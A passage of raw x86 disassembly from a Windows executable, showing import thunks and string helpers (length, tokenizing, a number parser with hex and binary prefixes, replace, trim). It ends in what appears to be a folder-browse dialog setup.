  403151:	03 46 08             	add    0x8(%esi),%eax
  403154:	03 c3                	add    %ebx,%eax
  403156:	50                   	push   %eax
  403157:	e8 cc ff ff ff       	call   0x403128
  40315c:	47                   	inc    %edi
  40315d:	3b 7e 04             	cmp    0x4(%esi),%edi
  403160:	7c e6                	jl     0x403148
  403162:	83 c6 14             	add    $0x14,%esi
  403165:	eb 1a                	jmp    0x403181
  403167:	03 c3                	add    %ebx,%eax
  403169:	83 38 00             	cmpl   $0x0,(%eax)
  40316c:	74 10                	je     0x40317e
  40316e:	ff 30                	push   (%eax)
  403170:	6a 00                	push   $0x0
  403172:	ff 35 b4 b3 40 00    	push   0x40b3b4
  403178:	ff 15 dc a6 40 00    	call   *0x40a6dc
  40317e:	83 c6 04             	add    $0x4,%esi
  403181:	8b 06                	mov    (%esi),%eax
  403183:	83 f8 ff             	cmp    $0xffffffff,%eax
  403186:	75 b4                	jne    0x40313c
  403188:	58                   	pop    %eax
  403189:	5f                   	pop    %edi
  40318a:	5e                   	pop    %esi
  40318b:	5b                   	pop    %ebx
  40318c:	5d                   	pop    %ebp
  40318d:	c2 08 00             	ret    $0x8
  403190:	ff 25 80 a6 40 00    	jmp    *0x40a680
  403196:	ff 25 84 a6 40 00    	jmp    *0x40a684
  40319c:	ff 25 ac a6 40 00    	jmp    *0x40a6ac
  4031a2:	ff 25 b0 a6 40 00    	jmp    *0x40a6b0
  4031a8:	ff 25 b4 a6 40 00    	jmp    *0x40a6b4
  4031ae:	ff 25 b8 a6 40 00    	jmp    *0x40a6b8
  4031b4:	ff 25 bc a6 40 00    	jmp    *0x40a6bc
  4031ba:	ff 25 c0 a6 40 00    	jmp    *0x40a6c0
  4031c0:	ff 25 c4 a6 40 00    	jmp    *0x40a6c4
  4031c6:	ff 25 c8 a6 40 00    	jmp    *0x40a6c8
  4031cc:	ff 25 cc a6 40 00    	jmp    *0x40a6cc
  4031d2:	ff 25 d0 a6 40 00    	jmp    *0x40a6d0
  4031d8:	ff 25 d4 a6 40 00    	jmp    *0x40a6d4
  4031de:	ff 25 d8 a6 40 00    	jmp    *0x40a6d8
  4031e4:	ff 25 dc a6 40 00    	jmp    *0x40a6dc
  4031ea:	ff 25 e0 a6 40 00    	jmp    *0x40a6e0
  4031f0:	8b 44 24 04          	mov    0x4(%esp),%eax
  4031f4:	85 c0                	test   %eax,%eax
  4031f6:	74 16                	je     0x40320e
  4031f8:	8d 50 01             	lea    0x1(%eax),%edx
  4031fb:	eb 03                	jmp    0x403200
  4031fd:	8d 49 00             	lea    0x0(%ecx),%ecx
  403200:	8a 08                	mov    (%eax),%cl
  403202:	83 c0 01             	add    $0x1,%eax
  403205:	84 c9                	test   %cl,%cl
  403207:	75 f7                	jne    0x403200
  403209:	2b c2                	sub    %edx,%eax
  40320b:	c2 04 00             	ret    $0x4
  40320e:	33 c0                	xor    %eax,%eax
  403210:	c2 04 00             	ret    $0x4
  403213:	cc                   	int3
  403214:	cc                   	int3
  403215:	cc                   	int3
  403216:	cc                   	int3
  403217:	cc                   	int3
  403218:	cc                   	int3
  403219:	cc                   	int3
  40321a:	cc                   	int3
  40321b:	cc                   	int3
  40321c:	cc                   	int3
  40321d:	cc                   	int3
  40321e:	cc                   	int3
  40321f:	cc                   	int3
  403220:	8b 44 24 04          	mov    0x4(%esp),%eax
  403224:	53                   	push   %ebx
  403225:	55                   	push   %ebp
  403226:	56                   	push   %esi
  403227:	33 ed                	xor    %ebp,%ebp
  403229:	85 c0                	test   %eax,%eax
  40322b:	57                   	push   %edi
  40322c:	75 05                	jne    0x403233
  40322e:	b8 00 90 40 00       	mov    $0x409000,%eax
  403233:	8b 7c 24 18          	mov    0x18(%esp),%edi
  403237:	83 ff 01             	cmp    $0x1,%edi
  40323a:	7d 05                	jge    0x403241
  40323c:	bf 01 00 00 00       	mov    $0x1,%edi
  403241:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  403245:	8a 11                	mov    (%ecx),%dl
  403247:	33 f6                	xor    %esi,%esi
  403249:	8b d8                	mov    %eax,%ebx
  40324b:	eb 03                	jmp    0x403250
  40324d:	8d 49 00             	lea    0x0(%ecx),%ecx
  403250:	8a 08                	mov    (%eax),%cl
  403252:	3a ca                	cmp    %dl,%cl
  403254:	74 04                	je     0x40325a
  403256:	84 c9                	test   %cl,%cl
  403258:	75 0e                	jne    0x403268
  40325a:	83 c6 01             	add    $0x1,%esi
  40325d:	3b f7                	cmp    %edi,%esi
  40325f:	74 0c                	je     0x40326d
  403261:	84 c9                	test   %cl,%cl
  403263:	74 0c                	je     0x403271
  403265:	8d 58 01             	lea    0x1(%eax),%ebx
  403268:	83 c0 01             	add    $0x1,%eax
  40326b:	eb e3                	jmp    0x403250
  40326d:	8b e8                	mov    %eax,%ebp
  40326f:	2b eb                	sub    %ebx,%ebp
  403271:	50                   	push   %eax
  403272:	e8 89 44 00 00       	call   0x407700
  403277:	8b 74 24 20          	mov    0x20(%esp),%esi
  40327b:	8b f8                	mov    %eax,%edi
  40327d:	85 ff                	test   %edi,%edi
  40327f:	74 11                	je     0x403292
  403281:	56                   	push   %esi
  403282:	e8 b9 44 00 00       	call   0x407740
  403287:	55                   	push   %ebp
  403288:	53                   	push   %ebx
  403289:	50                   	push   %eax
  40328a:	e8 55 4b 00 00       	call   0x407de4
  40328f:	83 c4 0c             	add    $0xc,%esp
  403292:	56                   	push   %esi
  403293:	55                   	push   %ebp
  403294:	e8 b7 44 00 00       	call   0x407750
  403299:	85 ff                	test   %edi,%edi
  40329b:	8b f0                	mov    %eax,%esi
  40329d:	75 0b                	jne    0x4032aa
  40329f:	55                   	push   %ebp
  4032a0:	53                   	push   %ebx
  4032a1:	56                   	push   %esi
  4032a2:	e8 3d 4b 00 00       	call   0x407de4
  4032a7:	83 c4 0c             	add    $0xc,%esp
  4032aa:	5f                   	pop    %edi
  4032ab:	c6 04 2e 00          	movb   $0x0,(%esi,%ebp,1)
  4032af:	5e                   	pop    %esi
  4032b0:	5d                   	pop    %ebp
  4032b1:	5b                   	pop    %ebx
  4032b2:	c2 10 00             	ret    $0x10
  4032b5:	cc                   	int3
  4032b6:	cc                   	int3
  4032b7:	cc                   	int3
  4032b8:	cc                   	int3
  4032b9:	cc                   	int3
  4032ba:	cc                   	int3
  4032bb:	cc                   	int3
  4032bc:	cc                   	int3
  4032bd:	cc                   	int3
  4032be:	cc                   	int3
  4032bf:	cc                   	int3
  4032c0:	56                   	push   %esi
  4032c1:	8b 74 24 08          	mov    0x8(%esp),%esi
  4032c5:	33 c0                	xor    %eax,%eax
  4032c7:	33 d2                	xor    %edx,%edx
  4032c9:	85 f6                	test   %esi,%esi
  4032cb:	0f 84 5e 01 00 00    	je     0x40342f
  4032d1:	8a 0e                	mov    (%esi),%cl
  4032d3:	80 f9 20             	cmp    $0x20,%cl
  4032d6:	74 05                	je     0x4032dd
  4032d8:	80 f9 09             	cmp    $0x9,%cl
  4032db:	75 05                	jne    0x4032e2
  4032dd:	83 c6 01             	add    $0x1,%esi
  4032e0:	eb ef                	jmp    0x4032d1
  4032e2:	8a 0e                	mov    (%esi),%cl
  4032e4:	80 f9 2d             	cmp    $0x2d,%cl
  4032e7:	53                   	push   %ebx
  4032e8:	55                   	push   %ebp
  4032e9:	57                   	push   %edi
  4032ea:	75 09                	jne    0x4032f5
  4032ec:	bf 01 00 00 00       	mov    $0x1,%edi
  4032f1:	03 f7                	add    %edi,%esi
  4032f3:	eb 0a                	jmp    0x4032ff
  4032f5:	33 ff                	xor    %edi,%edi
  4032f7:	80 f9 2b             	cmp    $0x2b,%cl
  4032fa:	75 03                	jne    0x4032ff
  4032fc:	83 c6 01             	add    $0x1,%esi
  4032ff:	8a 1e                	mov    (%esi),%bl
  403301:	80 fb 24             	cmp    $0x24,%bl
  403304:	0f 85 97 00 00 00    	jne    0x4033a1
  40330a:	8a 5e 01             	mov    0x1(%esi),%bl
  40330d:	83 c6 01             	add    $0x1,%esi
  403310:	80 fb 30             	cmp    $0x30,%bl
  403313:	7c 05                	jl     0x40331a
  403315:	80 fb 39             	cmp    $0x39,%bl
  403318:	7e 1c                	jle    0x403336
  40331a:	80 fb 41             	cmp    $0x41,%bl
  40331d:	7c 05                	jl     0x403324
  40331f:	80 fb 46             	cmp    $0x46,%bl
  403322:	7e 12                	jle    0x403336
  403324:	80 fb 61             	cmp    $0x61,%bl
  403327:	0f 8c f4 00 00 00    	jl     0x403421
  40332d:	80 fb 66             	cmp    $0x66,%bl
  403330:	0f 8f eb 00 00 00    	jg     0x403421
  403336:	80 fb 30             	cmp    $0x30,%bl
  403339:	7c 28                	jl     0x403363
  40333b:	80 fb 39             	cmp    $0x39,%bl
  40333e:	7f 23                	jg     0x403363
  403340:	6a 00                	push   $0x0
  403342:	83 e8 03             	sub    $0x3,%eax
  403345:	6a 10                	push   $0x10
  403347:	83 da 00             	sbb    $0x0,%edx
  40334a:	52                   	push   %edx
  40334b:	50                   	push   %eax
  40334c:	e8 5f 4a 00 00       	call   0x407db0
  403351:	8b c8                	mov    %eax,%ecx
  403353:	0f be c3             	movsbl %bl,%eax
  403356:	8b ea                	mov    %edx,%ebp
  403358:	99                   	cltd
  403359:	03 c8                	add    %eax,%ecx
  40335b:	13 ea                	adc    %edx,%ebp
  40335d:	8b c1                	mov    %ecx,%eax
  40335f:	8b d5                	mov    %ebp,%edx
  403361:	eb a7                	jmp    0x40330a
  403363:	6a 00                	push   $0x0
  403365:	6a 10                	push   $0x10
  403367:	52                   	push   %edx
  403368:	50                   	push   %eax
  403369:	e8 42 4a 00 00       	call   0x407db0
  40336e:	80 fb 61             	cmp    $0x61,%bl
  403371:	8b c8                	mov    %eax,%ecx
  403373:	0f be c3             	movsbl %bl,%eax
  403376:	8b ea                	mov    %edx,%ebp
  403378:	99                   	cltd
  403379:	7c 13                	jl     0x40338e
  40337b:	03 c8                	add    %eax,%ecx
  40337d:	13 ea                	adc    %edx,%ebp
  40337f:	83 e9 57             	sub    $0x57,%ecx
  403382:	83 dd 00             	sbb    $0x0,%ebp
  403385:	8b c1                	mov    %ecx,%eax
  403387:	8b d5                	mov    %ebp,%edx
  403389:	e9 7c ff ff ff       	jmp    0x40330a
  40338e:	03 c8                	add    %eax,%ecx
  403390:	13 ea                	adc    %edx,%ebp
  403392:	83 e9 37             	sub    $0x37,%ecx
  403395:	83 dd 00             	sbb    $0x0,%ebp
  403398:	8b c1                	mov    %ecx,%eax
  40339a:	8b d5                	mov    %ebp,%edx
  40339c:	e9 69 ff ff ff       	jmp    0x40330a
  4033a1:	80 fb 25             	cmp    $0x25,%bl
  4033a4:	75 3e                	jne    0x4033e4
  4033a6:	8a 5e 01             	mov    0x1(%esi),%bl
  4033a9:	83 c6 01             	add    $0x1,%esi
  4033ac:	80 fb 30             	cmp    $0x30,%bl
  4033af:	7c 70                	jl     0x403421
  4033b1:	80 fb 31             	cmp    $0x31,%bl
  4033b4:	7f 6b                	jg     0x403421
  4033b6:	6a 00                	push   $0x0
  4033b8:	83 e8 18             	sub    $0x18,%eax
  4033bb:	6a 02                	push   $0x2
  4033bd:	83 da 00             	sbb    $0x0,%edx
  4033c0:	52                   	push   %edx
  4033c1:	50                   	push   %eax
  4033c2:	e8 e9 49 00 00       	call   0x407db0
  4033c7:	8b c8                	mov    %eax,%ecx
  4033c9:	0f be c3             	movsbl %bl,%eax
  4033cc:	8a 5e 01             	mov    0x1(%esi),%bl
  4033cf:	8b ea                	mov    %edx,%ebp
  4033d1:	99                   	cltd
  4033d2:	03 c8                	add    %eax,%ecx
  4033d4:	13 ea                	adc    %edx,%ebp
  4033d6:	83 c6 01             	add    $0x1,%esi
  4033d9:	80 fb 30             	cmp    $0x30,%bl
  4033dc:	8b c1                	mov    %ecx,%eax
  4033de:	8b d5                	mov    %ebp,%edx
  4033e0:	7d cf                	jge    0x4033b1
  4033e2:	eb 3d                	jmp    0x403421
  4033e4:	80 fb 30             	cmp    $0x30,%bl
  4033e7:	7c 38                	jl     0x403421
  4033e9:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  4033f0:	80 fb 39             	cmp    $0x39,%bl
  4033f3:	7f 2c                	jg     0x403421
  4033f5:	6a 00                	push   $0x0
  4033f7:	6a 0a                	push   $0xa
  4033f9:	52                   	push   %edx
  4033fa:	50                   	push   %eax
  4033fb:	e8 b0 49 00 00       	call   0x407db0
  403400:	8b c8                	mov    %eax,%ecx
  403402:	0f be c3             	movsbl %bl,%eax
  403405:	8a 5e 01             	mov    0x1(%esi),%bl
  403408:	8b ea                	mov    %edx,%ebp
  40340a:	99                   	cltd
  40340b:	03 c8                	add    %eax,%ecx
  40340d:	13 ea                	adc    %edx,%ebp
  40340f:	83 e9 30             	sub    $0x30,%ecx
  403412:	83 dd 00             	sbb    $0x0,%ebp
  403415:	83 c6 01             	add    $0x1,%esi
  403418:	80 fb 30             	cmp    $0x30,%bl
  40341b:	8b c1                	mov    %ecx,%eax
  40341d:	8b d5                	mov    %ebp,%edx
  40341f:	7d cf                	jge    0x4033f0
  403421:	85 ff                	test   %edi,%edi
  403423:	5f                   	pop    %edi
  403424:	5d                   	pop    %ebp
  403425:	5b                   	pop    %ebx
  403426:	74 07                	je     0x40342f
  403428:	f7 d8                	neg    %eax
  40342a:	83 d2 00             	adc    $0x0,%edx
  40342d:	f7 da                	neg    %edx
  40342f:	5e                   	pop    %esi
  403430:	c2 04 00             	ret    $0x4
  403433:	cc                   	int3
  403434:	cc                   	int3
  403435:	cc                   	int3
  403436:	cc                   	int3
  403437:	cc                   	int3
  403438:	cc                   	int3
  403439:	cc                   	int3
  40343a:	cc                   	int3
  40343b:	cc                   	int3
  40343c:	cc                   	int3
  40343d:	cc                   	int3
  40343e:	cc                   	int3
  40343f:	cc                   	int3
  403440:	83 ec 0c             	sub    $0xc,%esp
  403443:	53                   	push   %ebx
  403444:	55                   	push   %ebp
  403445:	56                   	push   %esi
  403446:	8b 74 24 1c          	mov    0x1c(%esp),%esi
  40344a:	85 f6                	test   %esi,%esi
  40344c:	57                   	push   %edi
  40344d:	74 16                	je     0x403465
  40344f:	8b c6                	mov    %esi,%eax
  403451:	8d 50 01             	lea    0x1(%eax),%edx
  403454:	8a 08                	mov    (%eax),%cl
  403456:	83 c0 01             	add    $0x1,%eax
  403459:	84 c9                	test   %cl,%cl
  40345b:	75 f7                	jne    0x403454
  40345d:	2b c2                	sub    %edx,%eax
  40345f:	89 44 24 10          	mov    %eax,0x10(%esp)
  403463:	eb 08                	jmp    0x40346d
  403465:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  40346c:	00 
  40346d:	56                   	push   %esi
  40346e:	e8 8d 42 00 00       	call   0x407700
  403473:	8b 7c 24 24          	mov    0x24(%esp),%edi
  403477:	8b e8                	mov    %eax,%ebp
  403479:	57                   	push   %edi
  40347a:	89 6c 24 18          	mov    %ebp,0x18(%esp)
  40347e:	e8 7d 42 00 00       	call   0x407700
  403483:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  403487:	89 44 24 24          	mov    %eax,0x24(%esp)
  40348b:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  40348f:	50                   	push   %eax
  403490:	51                   	push   %ecx
  403491:	e8 ba 42 00 00       	call   0x407750
  403496:	85 ed                	test   %ebp,%ebp
  403498:	8b d8                	mov    %eax,%ebx
  40349a:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  40349e:	74 08                	je     0x4034a8
  4034a0:	55                   	push   %ebp
  4034a1:	e8 2a 43 00 00       	call   0x4077d0
  4034a6:	8b f0                	mov    %eax,%esi
  4034a8:	8b 44 24 24          	mov    0x24(%esp),%eax
  4034ac:	85 c0                	test   %eax,%eax
  4034ae:	74 08                	je     0x4034b8
  4034b0:	50                   	push   %eax
  4034b1:	e8 1a 43 00 00       	call   0x4077d0
  4034b6:	8b f8                	mov    %eax,%edi
  4034b8:	85 f6                	test   %esi,%esi
  4034ba:	8b eb                	mov    %ebx,%ebp
  4034bc:	89 6c 24 2c          	mov    %ebp,0x2c(%esp)
  4034c0:	0f 84 ce 00 00 00    	je     0x403594
  4034c6:	80 3e 00             	cmpb   $0x0,(%esi)
  4034c9:	0f 84 c5 00 00 00    	je     0x403594
  4034cf:	85 ff                	test   %edi,%edi
  4034d1:	0f 84 d6 00 00 00    	je     0x4035ad
  4034d7:	80 3f 00             	cmpb   $0x0,(%edi)
  4034da:	0f 84 cd 00 00 00    	je     0x4035ad
  4034e0:	8b c7                	mov    %edi,%eax
  4034e2:	8d 50 01             	lea    0x1(%eax),%edx
  4034e5:	8a 08                	mov    (%eax),%cl
  4034e7:	83 c0 01             	add    $0x1,%eax
  4034ea:	84 c9                	test   %cl,%cl
  4034ec:	75 f7                	jne    0x4034e5
  4034ee:	2b c2                	sub    %edx,%eax
  4034f0:	83 7c 24 24 00       	cmpl   $0x0,0x24(%esp)
  4034f5:	8b d8                	mov    %eax,%ebx
  4034f7:	74 35                	je     0x40352e
  4034f9:	83 7c 24 14 00       	cmpl   $0x0,0x14(%esp)
  4034fe:	75 2e                	jne    0x40352e
  403500:	a1 f8 b0 40 00       	mov    0x40b0f8,%eax
  403505:	8d 53 01             	lea    0x1(%ebx),%edx
  403508:	52                   	push   %edx
  403509:	6a 00                	push   $0x0
  40350b:	50                   	push   %eax
  40350c:	ff 15 e0 a6 40 00    	call   *0x40a6e0
  403512:	8b e8                	mov    %eax,%ebp
  403514:	8b d5                	mov    %ebp,%edx
  403516:	89 6c 24 18          	mov    %ebp,0x18(%esp)
  40351a:	8b c7                	mov    %edi,%eax
  40351c:	2b d7                	sub    %edi,%edx
  40351e:	8b ff                	mov    %edi,%edi
  403520:	8a 08                	mov    (%eax),%cl
  403522:	88 0c 02             	mov    %cl,(%edx,%eax,1)
  403525:	83 c0 01             	add    $0x1,%eax
  403528:	84 c9                	test   %cl,%cl
  40352a:	75 f4                	jne    0x403520
  40352c:	8b fd                	mov    %ebp,%edi
  40352e:	f6 44 24 28 01       	testb  $0x1,0x28(%esp)
  403533:	bd ea 7d 40 00       	mov    $0x407dea,%ebp
  403538:	75 05                	jne    0x40353f
  40353a:	bd f0 7d 40 00       	mov    $0x407df0,%ebp
  40353f:	80 3e 00             	cmpb   $0x0,(%esi)
  403542:	74 27                	je     0x40356b
  403544:	53                   	push   %ebx
  403545:	57                   	push   %edi
  403546:	56                   	push   %esi
  403547:	ff d5                	call   *%ebp
  403549:	83 c4 0c             	add    $0xc,%esp
  40354c:	85 c0                	test   %eax,%eax
  40354e:	75 04                	jne    0x403554
  403550:	03 f3                	add    %ebx,%esi
  403552:	eb 12                	jmp    0x403566
  403554:	8b 44 24 20          	mov    0x20(%esp),%eax
  403558:	8a 0e                	mov    (%esi),%cl
  40355a:	88 08                	mov    %cl,(%eax)
  40355c:	83 c0 01             	add    $0x1,%eax
  40355f:	89 44 24 20          	mov    %eax,0x20(%esp)
  403563:	83 c6 01             	add    $0x1,%esi
  403566:	80 3e 00             	cmpb   $0x0,(%esi)
  403569:	75 d9                	jne    0x403544
  40356b:	83 7c 24 24 00       	cmpl   $0x0,0x24(%esp)
  403570:	74 1a                	je     0x40358c
  403572:	83 7c 24 14 00       	cmpl   $0x0,0x14(%esp)
  403577:	75 13                	jne    0x40358c
  403579:	8b 54 24 18          	mov    0x18(%esp),%edx
  40357d:	a1 f8 b0 40 00       	mov    0x40b0f8,%eax
  403582:	52                   	push   %edx
  403583:	6a 00                	push   $0x0
  403585:	50                   	push   %eax
  403586:	ff 15 dc a6 40 00    	call   *0x40a6dc
  40358c:	8b 6c 24 2c          	mov    0x2c(%esp),%ebp
  403590:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  403594:	2b eb                	sub    %ebx,%ebp
  403596:	03 6c 24 10          	add    0x10(%esp),%ebp
  40359a:	55                   	push   %ebp
  40359b:	e8 50 42 00 00       	call   0x4077f0
  4035a0:	5f                   	pop    %edi
  4035a1:	5e                   	pop    %esi
  4035a2:	5d                   	pop    %ebp
  4035a3:	c6 03 00             	movb   $0x0,(%ebx)
  4035a6:	5b                   	pop    %ebx
  4035a7:	83 c4 0c             	add    $0xc,%esp
  4035aa:	c2 10 00             	ret    $0x10
  4035ad:	8b d3                	mov    %ebx,%edx
  4035af:	8b c6                	mov    %esi,%eax
  4035b1:	2b d6                	sub    %esi,%edx
  4035b3:	8a 08                	mov    (%eax),%cl
  4035b5:	88 0c 02             	mov    %cl,(%edx,%eax,1)
  4035b8:	83 c0 01             	add    $0x1,%eax
  4035bb:	84 c9                	test   %cl,%cl
  4035bd:	75 f4                	jne    0x4035b3
  4035bf:	03 5c 24 10          	add    0x10(%esp),%ebx
  4035c3:	eb cf                	jmp    0x403594
  4035c5:	cc                   	int3
  4035c6:	cc                   	int3
  4035c7:	cc                   	int3
  4035c8:	cc                   	int3
  4035c9:	cc                   	int3
  4035ca:	cc                   	int3
  4035cb:	cc                   	int3
  4035cc:	cc                   	int3
  4035cd:	cc                   	int3
  4035ce:	cc                   	int3
  4035cf:	cc                   	int3
  4035d0:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4035d4:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  4035d8:	8b 54 24 04          	mov    0x4(%esp),%edx
  4035dc:	50                   	push   %eax
  4035dd:	6a 00                	push   $0x0
  4035df:	51                   	push   %ecx
  4035e0:	52                   	push   %edx
  4035e1:	e8 5a fe ff ff       	call   0x403440
  4035e6:	c2 0c 00             	ret    $0xc
  4035e9:	cc                   	int3
  4035ea:	cc                   	int3
  4035eb:	cc                   	int3
  4035ec:	cc                   	int3
  4035ed:	cc                   	int3
  4035ee:	cc                   	int3
  4035ef:	cc                   	int3
  4035f0:	53                   	push   %ebx
  4035f1:	56                   	push   %esi
  4035f2:	8b 74 24 0c          	mov    0xc(%esp),%esi
  4035f6:	57                   	push   %edi
  4035f7:	56                   	push   %esi
  4035f8:	e8 f3 fb ff ff       	call   0x4031f0
  4035fd:	85 f6                	test   %esi,%esi
  4035ff:	8b d8                	mov    %eax,%ebx
  403601:	74 4b                	je     0x40364e
  403603:	80 3e 20             	cmpb   $0x20,(%esi)
  403606:	8b fe                	mov    %esi,%edi
  403608:	75 0e                	jne    0x403618
  40360a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  403610:	83 c6 01             	add    $0x1,%esi
  403613:	80 3e 20             	cmpb   $0x20,(%esi)
  403616:	74 f8                	je     0x403610
  403618:	2b f7                	sub    %edi,%esi
  40361a:	3b f3                	cmp    %ebx,%esi
  40361c:	89 74 24 10          	mov    %esi,0x10(%esp)
  403620:	7d 24                	jge    0x403646
  403622:	80 7c 1f ff 20       	cmpb   $0x20,-0x1(%edi,%ebx,1)
  403627:	8d 44 1f ff          	lea    -0x1(%edi,%ebx,1),%eax
  40362b:	75 0b                	jne    0x403638
  40362d:	8d 49 00             	lea    0x0(%ecx),%ecx
  403630:	83 e8 01             	sub    $0x1,%eax
  403633:	80 38 20             	cmpb   $0x20,(%eax)
  403636:	74 f8                	je     0x403630
  403638:	8b cf                	mov    %edi,%ecx
  40363a:	2b c8                	sub    %eax,%ecx
  40363c:	8d 44 19 ff          	lea    -0x1(%ecx,%ebx,1),%eax
  403640:	03 c6                	add    %esi,%eax
  403642:	2b d8                	sub    %eax,%ebx
  403644:	eb 0a                	jmp    0x403650
  403646:	33 c0                	xor    %eax,%eax
  403648:	8b c6                	mov    %esi,%eax
  40364a:	2b d8                	sub    %eax,%ebx
  40364c:	eb 02                	jmp    0x403650
  40364e:	33 ff                	xor    %edi,%edi
  403650:	55                   	push   %ebp
  403651:	57                   	push   %edi
  403652:	e8 a9 40 00 00       	call   0x407700
  403657:	8b 54 24 18          	mov    0x18(%esp),%edx
  40365b:	52                   	push   %edx
  40365c:	53                   	push   %ebx
  40365d:	8b e8                	mov    %eax,%ebp
  40365f:	e8 ec 40 00 00       	call   0x407750
  403664:	85 ed                	test   %ebp,%ebp
  403666:	8b f0                	mov    %eax,%esi
  403668:	74 08                	je     0x403672
  40366a:	55                   	push   %ebp
  40366b:	e8 60 41 00 00       	call   0x4077d0
  403670:	8b f8                	mov    %eax,%edi
  403672:	85 ff                	test   %edi,%edi
  403674:	5d                   	pop    %ebp
  403675:	74 14                	je     0x40368b
  403677:	8b 44 24 10          	mov    0x10(%esp),%eax
  40367b:	53                   	push   %ebx
  40367c:	03 c7                	add    %edi,%eax
  40367e:	50                   	push   %eax
  40367f:	56                   	push   %esi
  403680:	e8 8b 41 00 00       	call   0x407810
  403685:	5f                   	pop    %edi
  403686:	5e                   	pop    %esi
  403687:	5b                   	pop    %ebx
  403688:	c2 08 00             	ret    $0x8
  40368b:	5f                   	pop    %edi
  40368c:	c6 06 00             	movb   $0x0,(%esi)
  40368f:	5e                   	pop    %esi
  403690:	5b                   	pop    %ebx
  403691:	c2 08 00             	ret    $0x8
  403694:	e8 7b 47 00 00       	call   0x407e14
  403699:	6a 00                	push   $0x0
  40369b:	ff 15 70 a8 40 00    	call   *0x40a870
  4036a1:	c3                   	ret
  4036a2:	56                   	push   %esi
  4036a3:	6a 01                	push   $0x1
  4036a5:	e8 0b 02 00 00       	call   0x4038b5
  4036aa:	ff 74 24 10          	push   0x10(%esp)
  4036ae:	ff 74 24 0c          	push   0xc(%esp)
  4036b2:	ff 74 24 14          	push   0x14(%esp)
  4036b6:	e8 52 02 00 00       	call   0x40390d
  4036bb:	50                   	push   %eax
  4036bc:	ff 15 60 a7 40 00    	call   *0x40a760
  4036c2:	6a 00                	push   $0x0
  4036c4:	8b f0                	mov    %eax,%esi
  4036c6:	e8 ea 01 00 00       	call   0x4038b5
  4036cb:	8b c6                	mov    %esi,%eax
  4036cd:	5e                   	pop    %esi
  4036ce:	c2 0c 00             	ret    $0xc
  4036d1:	8b 44 24 08          	mov    0x8(%esp),%eax
  4036d5:	48                   	dec    %eax
  4036d6:	75 1b                	jne    0x4036f3
  4036d8:	39 44 24 10          	cmp    %eax,0x10(%esp)
  4036dc:	74 15                	je     0x4036f3
  4036de:	ff 74 24 10          	push   0x10(%esp)
  4036e2:	6a 01                	push   $0x1
  4036e4:	68 66 04 00 00       	push   $0x466
  4036e9:	ff 74 24 10          	push   0x10(%esp)
  4036ed:	ff 15 64 a7 40 00    	call   *0x40a764
  4036f3:	33 c0                	xor    %eax,%eax
  4036f5:	c2 10 00             	ret    $0x10
  4036f8:	55                   	push   %ebp
  4036f9:	8b ec                	mov    %esp,%ebp
  4036fb:	81 ec 28 01 00 00    	sub    $0x128,%esp
  403701:	53                   	push   %ebx
  403702:	33 db                	xor    %ebx,%ebx
  403704:	39 1d bc b1 40 00    	cmp    %ebx,0x40b1bc
  40370a:	57                   	push   %edi
  40370b:	75 11                	jne    0x40371e
  40370d:	53                   	push   %ebx
  40370e:	c7 05 bc b1 40 00 01 	movl   $0x1,0x40b1bc
  403715:	00 00 00 
  403718:	ff 15 70 a8 40 00    	call   *0x40a870
  40371e:	6a 20                	push   $0x20
  403720:	8d 45 dc             	lea    -0x24(%ebp),%eax
  403723:	53                   	push   %ebx
  403724:	50                   	push   %eax
  403725:	e8 66 fa ff ff       	call   0x403190
  40372a:	83 c4 0c             	add    $0xc,%esp
  40372d:	68 2c 90 40 00       	push   $0x40902c
  403732:	ff 15 e4 a6 40 00    	call   *0x40a6e4
  403738:	3b c3                	cmp    %ebx,%eax
  40373a:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40373d:	bf 04 01 00 00       	mov    $0x104,%edi
  403742:	0f 84 ec 00 00 00    	je     0x403834
  403748:	39 5d 0c             	cmp    %ebx,0xc(%ebp)
  40374b:	75 07                	jne    0x403754
  40374d:	c7 45 0c 00 90 40 00 	movl   $0x409000,0xc(%ebp)
  403754:	68 03 01 00 00       	push   $0x103
  403759:	ff 75 0c             	push   0xc(%ebp)
  40375c:	8d 85 d8 fe ff ff    	lea    -0x128(%ebp),%eax
  403762:	50                   	push   %eax
  403763:	e8 7c 46 00 00       	call   0x407de4
  403768:	8d 85 d8 fe ff ff    	lea    -0x128(%ebp),%eax
  40376e:	50                   	push   %eax
  40376f:	88 5d db             	mov    %bl,-0x25(%ebp)
  403772:	e8 7f 46 00 00       	call   0x407df6
  403777:	83 c4 10             	add    $0x10,%esp
  40377a:	83 f8 03             	cmp    $0x3,%eax
  40377d:	7e 0e                	jle    0x40378d
  40377f:	8d 84 05 d7 fe ff ff 	lea    -0x129(%ebp,%eax,1),%eax
  403786:	80 38 5c             	cmpb   $0x5c,(%eax)
  403789:	75 02                	jne    0x40378d
  40378b:	88 18                	mov    %bl,(%eax)
  40378d:	56                   	push   %esi
  40378e:	8b 35 e8 a6 40 00    	mov    0x40a6e8,%esi
  403794:	68 18 90 40 00       	push   $0x409018
  403799:	ff 75 fc             	push   -0x4(%ebp)
  40379c:	ff d6                	call   *%esi
  40379e:	89 45 0c             	mov    %eax,0xc(%ebp)
  4037a1:	8b 45 08             	mov    0x8(%ebp),%eax
  4037a4:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4037a7:	e8 61 01 00 00       	call   0x40390d
  4037ac:	89 45 dc             	mov    %eax,-0x24(%ebp)
  4037af:	8d 85 d8 fe ff ff    	lea    -0x128(%ebp),%eax
  4037b5:	6a 01                	push   $0x1
  4037b7:	c7 45 ec 40 00 00 00 	movl   $0x40,-0x14(%ebp)
  4037be:	c7 45 f0 d1 36 40 00 	movl   $0x4036d1,-0x10(%ebp)
  4037c5:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4037c8:	e8 e8 00 00 00       	call   0x4038b5
  4037cd:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4037d0:	50                   	push   %eax
  4037d1:	ff 55 0c             	call   *0xc(%ebp)
  4037d4:	6a 00                	push   $0x0
